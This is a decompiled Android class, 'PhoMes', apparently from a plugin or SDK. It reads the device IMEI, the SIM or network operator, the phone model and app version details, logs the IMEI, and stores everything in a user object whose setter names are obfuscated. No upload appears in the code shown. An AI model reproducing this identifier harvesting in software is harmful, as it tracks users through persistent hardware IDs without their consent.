public class com.cont.fun.PhoMes {
	 /* .source "PhoMes.java" */
	 /* # static fields */
	 public static final java.lang.String TAG;
	 /* # instance fields */
	 private com.cont.bean.US Us;
	 private android.content.Context context;
	 /* # direct methods */
	 static com.cont.fun.PhoMes ( ) {
		 /* .locals 1 */
		 /* .prologue */
		 /* .line 23 */
		 /* const-class v0, Lcom/cont/fun/PhoMes; */
		 (( java.lang.Class ) v0 ).getSimpleName ( ); // invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;
		 return;
	 } // .end method
	 public com.cont.fun.PhoMes ( ) {
		 /* .locals 1 */
		 /* .param p1, "context" # Landroid/content/Context; */
		 /* .prologue */
		 /* .line 27 */
		 /* invoke-direct {p0}, Ljava/lang/Object;-><init>()V */
		 /* .line 24 */
		 /* new-instance v0, Lcom/cont/bean/US; */
		 /* invoke-direct {v0}, Lcom/cont/bean/US;-><init>()V */
		 this.Us = v0;
		 /* .line 29 */
		 this.context = p1;
		 /* .line 31 */
		 try { // :try_start_0
			 /* invoke-direct {p0}, Lcom/cont/fun/PhoMes;->initTelephony()V */
			 /* :try_end_0 */
			 /* .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 ..:try_end_0} :catch_0 */
			 /* .line 36 */
		 } // :goto_0
		 return;
		 /* .line 32 */
		 /* :catch_0 */
		 /* move-exception v0 */
	 } // .end method
	 private void initTelephony ( ) {
		 /* .locals 23 */
		 /* .annotation system Ldalvik/annotation/Throws; */
		 /* value = { */
		 /* Landroid/content/pm/PackageManager$NameNotFoundException; */
		 /* } */
	 } // .end annotation
	 /* .prologue */
	 /* .line 40 */
	 /* move-object/from16 v0, p0 */
	 v0 = this.context;
	 /* move-object/from16 v20, v0 */
	 final String v21 = "phone"; // const-string v21, "phone"
	 /* invoke-virtual/range {v20 ..v21}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object; */
	 /* check-cast v14, Landroid/telephony/TelephonyManager; */
	 /* .line 42 */
	 /* .local v14, "tm":Landroid/telephony/TelephonyManager; */
	 if ( v14 != null) { // if-eqz v14, :cond_3
		 /* .line 45 */
		 (( android.telephony.TelephonyManager ) v14 ).getDeviceId ( ); // invoke-virtual {v14}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
		 /* .line 46 */
		 /* .local v5, "imei":Ljava/lang/String; */
		 v20 = com.cont.fun.PhoMes.TAG;
		 /* new-instance v21, Ljava/lang/StringBuilder; */
		 final String v22 = "IMEI:"; // const-string v22, "IMEI:"
		 /* invoke-direct/range {v21 ..v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
		 /* move-object/from16 v0, v21 */
		 (( java.lang.StringBuilder ) v0 ).append ( v5 ); // invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 /* invoke-virtual/range {v21 ..v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String; */
		 /* invoke-static/range {v20 ..v21}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I */
		 /* .line 49 */
		 (( android.telephony.TelephonyManager ) v14 ).getSimOperator ( ); // invoke-virtual {v14}, Landroid/telephony/TelephonyManager;->getSimOperator()Ljava/lang/String;
		 /* .line 50 */
		 /* .local v6, "imsi":Ljava/lang/String; */
		 if ( v6 != null) { // if-eqz v6, :cond_0
			 (( java.lang.String ) v6 ).trim ( ); // invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;
			 v20 = 			 /* invoke-virtual/range {v20 ..v20}, Ljava/lang/String;->length()I */
			 /* if-gtz v20, :cond_1 */
			 /* .line 53 */
		 } // :cond_0
		 /* new-instance v20, Ljava/lang/StringBuilder; */
		 (( android.telephony.TelephonyManager ) v14 ).getNetworkOperator ( ); // invoke-virtual {v14}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;
		 /* invoke-static/range {v21 ..v21}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String; */
		 /* invoke-direct/range {v20 ..v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
		 final String v21 = "00000000"; // const-string v21, "00000000"
		 /* invoke-virtual/range {v20 ..v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder; */
		 /* invoke-virtual/range {v20 ..v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String; */
		 /* .line 57 */
	 } // :cond_1
	 v15 = android.os.Build.MODEL;
	 /* .line 59 */
	 /* .local v15, "ua":Ljava/lang/String; */
	 /* move-object/from16 v0, p0 */
	 v0 = this.context;
	 /* move-object/from16 v20, v0 */
	 /* invoke-virtual/range {v20 ..v20}, Landroid/content/Context;->getPackageName()Ljava/lang/String; */
	 /* .line 60 */
	 /* .local v9, "packageName":Ljava/lang/String; */
	 /* move-object/from16 v0, p0 */
	 v0 = this.context;
	 /* move-object/from16 v20, v0 */
	 /* invoke-virtual/range {v20 ..v20}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager; */
	 /* .line 61 */
	 /* .local v8, "packageManager":Landroid/content/pm/PackageManager; */
	 /* const/16 v20, 0x0 */
	 /* move/from16 v0, v20 */
	 (( android.content.pm.PackageManager ) v8 ).getPackageInfo ( v9, v0 ); // invoke-virtual {v8, v9, v0}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
	 /* .line 62 */
	 /* .local v7, "packageInfo":Landroid/content/pm/PackageInfo; */
	 v0 = this.versionName;
	 /* move-object/from16 v19, v0 */
	 /* .line 63 */
	 /* .local v19, "versionName":Ljava/lang/String; */
	 /* iget v0, v7, Landroid/content/pm/PackageInfo;->versionCode:I */
	 /* move/from16 v18, v0 */
	 /* .line 66 */
	 /* .local v18, "versionCode":I */
	 /* const/16 v16, -0x1 */
	 /* .line 67 */
	 /* .local v16, "uid":I */
	 java.lang.System .currentTimeMillis ( );
	 /* move-result-wide v11 */
	 /* .line 70 */
	 /* .local v11, "regTime":J */
	 try { // :try_start_0
		 /* new-instance v17, Ljava/io/File; */
		 /* move-object/from16 v0, p0 */
		 v0 = this.context;
		 /* move-object/from16 v20, v0 */
		 /* invoke-virtual/range {v20 ..v20}, Landroid/content/Context;->getFilesDir()Ljava/io/File; */
		 final String v21 = "ContMes.txt"; // const-string v21, "ContMes.txt"
		 /* move-object/from16 v0, v17 */
		 /* move-object/from16 v1, v20 */
		 /* move-object/from16 v2, v21 */
		 /* invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V */
		 /* .line 71 */
		 /* .local v17, "userFile":Ljava/io/File; */
		 v20 = 		 /* invoke-virtual/range {v17 ..v17}, Ljava/io/File;->exists()Z */
		 if ( v20 != null) { // if-eqz v20, :cond_2
			 /* .line 72 */
			 final String v20 = "utf-8"; // const-string v20, "utf-8"
			 /* move-object/from16 v0, v17 */
			 /* move-object/from16 v1, v20 */
			 com.cont.tools.Tools .readFileContent ( v0,v1 );
			 /* .line 73 */
			 /* .local v4, "content":Ljava/lang/String; */
			 if ( v4 != null) { // if-eqz v4, :cond_2
				 (( java.lang.String ) v4 ).trim ( ); // invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;
				 final String v21 = ""; // const-string v21, ""
				 v20 = 				 /* invoke-virtual/range {v20 ..v21}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z */
				 /* if-nez v20, :cond_2 */
				 /* .line 74 */
				 final String v20 = "\n"; // const-string v20, "\n"
				 final String v21 = ""; // const-string v21, ""
				 /* move-object/from16 v0, v20 */
				 /* move-object/from16 v1, v21 */
				 (( java.lang.String ) v4 ).replace ( v0, v1 ); // invoke-virtual {v4, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
				 /* .line 75 */
				 final String v20 = "\r"; // const-string v20, "\r"
				 final String v21 = ""; // const-string v21, ""
				 /* move-object/from16 v0, v20 */
				 /* move-object/from16 v1, v21 */
				 (( java.lang.String ) v4 ).replace ( v0, v1 ); // invoke-virtual {v4, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
				 /* .line 76 */
				 (( java.lang.String ) v4 ).trim ( ); // invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;
				 /* .line 77 */
				 final String v20 = ","; // const-string v20, ","
				 /* move-object/from16 v0, v20 */
				 (( java.lang.String ) v4 ).split ( v0 ); // invoke-virtual {v4, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
				 /* .line 78 */
				 /* .local v13, "strings":[Ljava/lang/String; */
				 /* array-length v0, v13 */
				 /* move/from16 v20, v0 */
				 /* const/16 v21, 0x2 */
				 /* move/from16 v0, v20 */
				 /* move/from16 v1, v21 */
				 /* if-ne v0, v1, :cond_2 */
				 /* .line 79 */
				 /* const/16 v20, 0x0 */
				 /* aget-object v20, v13, v20 */
				 v16 = 				 /* invoke-static/range {v20 ..v20}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I */
				 /* .line 80 */
				 /* const/16 v20, 0x1 */
				 /* aget-object v20, v13, v20 */
				 /* invoke-static/range {v20 ..v20}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J */
				 /* :try_end_0 */
				 /* .catch Ljava/io/IOException; {:try_start_0 ..:try_end_0} :catch_0 */
				 /* move-result-wide v11 */
				 /* .line 89 */
			 } // .end local v4 # "content":Ljava/lang/String;
		 } // .end local v13 # "strings":[Ljava/lang/String;
	 } // .end local v17 # "userFile":Ljava/io/File;
} // :cond_2
} // :goto_0
/* move-object/from16 v0, p0 */
v0 = this.context;
/* move-object/from16 v20, v0 */
/* invoke-virtual/range {v20 ..v20}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager; */
/* .line 90 */
/* move-object/from16 v0, p0 */
v0 = this.context;
/* move-object/from16 v21, v0 */
/* invoke-virtual/range {v21 ..v21}, Landroid/content/Context;->getPackageName()Ljava/lang/String; */
/* .line 91 */
/* const/16 v22, 0x80 */
/* .line 90 */
/* invoke-virtual/range {v20 ..v22}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo; */
/* .line 92 */
/* .local v3, "appInfo":Landroid/content/pm/ApplicationInfo; */
v0 = this.metaData;
/* move-object/from16 v20, v0 */
final String v21 = "cont_pv"; // const-string v21, "cont_pv"
v10 = /* invoke-virtual/range {v20 ..v21}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I */
/* .line 94 */
/* .local v10, "pluVer":I */
/* move-object/from16 v0, p0 */
v0 = this.Us;
/* move-object/from16 v20, v0 */
/* new-instance v21, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v10 );
/* invoke-direct/range {v21 ..v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
/* invoke-virtual/range {v21 ..v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String; */
/* invoke-virtual/range {v20 ..v21}, Lcom/cont/bean/US;->setPlsvstnCe(Ljava/lang/String;)V */
/* .line 95 */
/* move-object/from16 v0, p0 */
v0 = this.Us;
/* move-object/from16 v20, v0 */
/* move-object/from16 v0, v20 */
/* move/from16 v1, v16 */
(( com.cont.bean.US ) v0 ).setUid ( v1 ); // invoke-virtual {v0, v1}, Lcom/cont/bean/US;->setUid(I)V
/* .line 96 */
/* move-object/from16 v0, p0 */
v0 = this.Us;
/* move-object/from16 v20, v0 */
/* move-object/from16 v0, v20 */
(( com.cont.bean.US ) v0 ).setPlsfgjme ( v9 ); // invoke-virtual {v0, v9}, Lcom/cont/bean/US;->setPlsfgjme(Ljava/lang/String;)V
/* .line 97 */
/* move-object/from16 v0, p0 */
v0 = this.Us;
/* move-object/from16 v20, v0 */
/* move-object/from16 v0, v20 */
(( com.cont.bean.US ) v0 ).setRdghsme ( v11, v12 ); // invoke-virtual {v0, v11, v12}, Lcom/cont/bean/US;->setRdghsme(J)V
/* .line 98 */
/* move-object/from16 v0, p0 */
v0 = this.Us;
/* move-object/from16 v20, v0 */
/* new-instance v21, Ljava/lang/StringBuilder; */
/* invoke-static/range {v18 ..v18}, Ljava/lang/String;->valueOf(I)Ljava/lang/String; */
/* invoke-direct/range {v21 ..v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
/* invoke-virtual/range {v21 ..v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String; */
/* invoke-virtual/range {v20 ..v21}, Lcom/cont/bean/US;->setVggshfode(Ljava/lang/String;)V */
/* .line 99 */
/* move-object/from16 v0, p0 */
v0 = this.Us;
/* move-object/from16 v20, v0 */
/* move-object/from16 v0, v20 */
/* move-object/from16 v1, v19 */
(( com.cont.bean.US ) v0 ).setVketudfghonName ( v1 ); // invoke-virtual {v0, v1}, Lcom/cont/bean/US;->setVketudfghonName(Ljava/lang/String;)V
/* .line 100 */
/* move-object/from16 v0, p0 */
v0 = this.Us;
/* move-object/from16 v20, v0 */
/* new-instance v21, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v5 );
/* invoke-direct/range {v21 ..v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
v22 = com.cont.bean.US.split;
/* invoke-virtual/range {v21 ..v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder; */
/* move-object/from16 v0, v21 */
(( java.lang.StringBuilder ) v0 ).append ( v6 ); // invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
/* invoke-virtual/range {v21 ..v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String; */
/* invoke-virtual/range {v20 ..v21}, Lcom/cont/bean/US;->setdsgssi(Ljava/lang/String;)V */
/* .line 101 */
/* move-object/from16 v0, p0 */
v0 = this.Us;
/* move-object/from16 v20, v0 */
/* move-object/from16 v0, v20 */
(( com.cont.bean.US ) v0 ).setUsda ( v15 ); // invoke-virtual {v0, v15}, Lcom/cont/bean/US;->setUsda(Ljava/lang/String;)V
/* .line 103 */
} // .end local v3 # "appInfo":Landroid/content/pm/ApplicationInfo;
} // .end local v5 # "imei":Ljava/lang/String;
} // .end local v6 # "imsi":Ljava/lang/String;
} // .end local v7 # "packageInfo":Landroid/content/pm/PackageInfo;
} // .end local v8 # "packageManager":Landroid/content/pm/PackageManager;
} // .end local v9 # "packageName":Ljava/lang/String;
} // .end local v10 # "pluVer":I
} // .end local v11 # "regTime":J
} // .end local v15 # "ua":Ljava/lang/String;
} // .end local v16 # "uid":I
} // .end local v18 # "versionCode":I
} // .end local v19 # "versionName":Ljava/lang/String;
} // :cond_3
return;
/* .line 85 */
/* .restart local v5 # "imei":Ljava/lang/String; */
/* .restart local v6 # "imsi":Ljava/lang/String; */
/* .restart local v7 # "packageInfo":Landroid/content/pm/PackageInfo; */
/* .restart local v8 # "packageManager":Landroid/content/pm/PackageManager; */
/* .restart local v9 # "packageName":Ljava/lang/String; */
/* .restart local v11 # "regTime":J */
/* .restart local v15 # "ua":Ljava/lang/String; */
/* .restart local v16 # "uid":I */
/* .restart local v18 # "versionCode":I */
/* .restart local v19 # "versionName":Ljava/lang/String; */
/* :catch_0 */
/* move-exception v20 */
/* goto/16 :goto_0 */
} // .end method
/* # virtual methods */
public com.cont.bean.US getUser ( ) {
/* .locals 1 */
/* .prologue */
/* .line 106 */
v0 = this.Us;
} // .end method
public void setUser ( com.cont.bean.US p0 ) {
/* .locals 0 */
/* .param p1, "user" # Lcom/cont/bean/US; */
/* .prologue */
/* .line 110 */
this.Us = p1;
/* .line 111 */
return;
} // .end method
